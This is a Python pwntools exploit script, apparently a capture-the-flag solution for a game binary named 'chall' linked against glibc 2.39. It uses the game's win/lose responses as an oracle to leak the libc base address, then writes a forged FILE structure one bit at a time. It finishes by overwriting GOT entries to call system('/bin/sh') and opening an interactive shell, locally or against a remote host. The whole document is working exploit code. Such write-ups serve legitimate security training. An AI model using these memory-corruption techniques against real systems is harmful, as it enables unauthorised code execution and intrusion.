#!/usr/bin/env python3

from pwn import context, ELF, flat, p64, remote, sys, u64

context.binary = elf = ELF('chall')
glibc = ELF('libc-2.39.so', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port, ssl=True)


def fight(win: bool = False):
    io.sendlineafter(b'> ', b'f')
    io.sendlineafter(b'Player plays: ', b'18446744073709551615' if win else b'0')
    assert (b'You win!' if win else b'Bot wins!') in io.recvline()


def simulate_player(number: int) -> bool:
    io.sendlineafter(b'> ', b's')
    io.sendlineafter(b'Bot number: ', b'-')
    io.sendlineafter(b'Player number: ', str(number).encode())
    return b'You win!' in io.recvline()


io = get_process()

for e in range(1, 64 + 1):
    if simulate_player(2 ** e - 1):
        break

known = 0
bit = 0

while known.bit_count() != e:
    test = known
    m1 = test + int(('1' * (e - test.bit_count())).zfill(64)[::-1], 2)
    test |= (1 << bit)
    m2 = test + int(('1' * (e - test.bit_count())).zfill(64)[::-1], 2)

    if not simulate_player(m1) and not simulate_player(m2):
        known |= 1 << bit

    bit += 1

glibc.address = ((known & 0x7fffffffffff) | 0x7e0000000000) - 0x955c2
io.success(f'Glibc base address: {hex(glibc.address)}')

for _ in range(128):
    fight()

target = 0x4040a0

for i in range(64):
    fight(win=bool((target >> i) & 1))

payload = p64(0x404088)          + p64(glibc.sym.__stack_chk_fail) + \
          p64(glibc.sym.printf)  + p64(glibc.sym.system)           + \
          p64(glibc.sym.setvbuf) + p64(glibc.sym.fopen)            + \
          p64(glibc.sym.scanf)   + p64(glibc.sym.getc)             + \
          p64(glibc.sym.rand)    + p64(0)                          + \
          p64(0)                 + p64(glibc.sym._IO_2_1_stdout_)  + \
          p64(0)                 + p64(glibc.sym._IO_2_1_stdin_)   + \
          p64(0)                 + p64(0)                          + \
          b'/bin/sh\0'

fp = flat([
    0xfbad2000,                    0,
    0,                             0,
    0,                             0,
    0,                             elf.got.fread,
    elf.got.fread + len(payload),  0,
    0,                             0,
    0,                             glibc.sym._IO_2_1_stderr_,
    0,                             0,
    0,                             target + 0xe0,
    0xffffffffffffffff,            0,
    target + 0xf0,                 0,
    0,                             0,
    0xffffffff,                    0,
    0,                             glibc.sym._IO_file_jumps,
])

prog = io.progress('Writing FILE struct')

for i, target in enumerate([u64(fp[i : i + 8]) for i in range(0, len(fp), 8)]):
    prog.status(f'{i + 1} / {len(fp) // 8}')
    for i in range(64):
        fight(win=bool((target >> i) & 1))

prog.success()

io.sendlineafter(b'> ', b'r')
io.recvuntil(b'Bot reseeded!\n')

io.send(payload)
io.interactive()
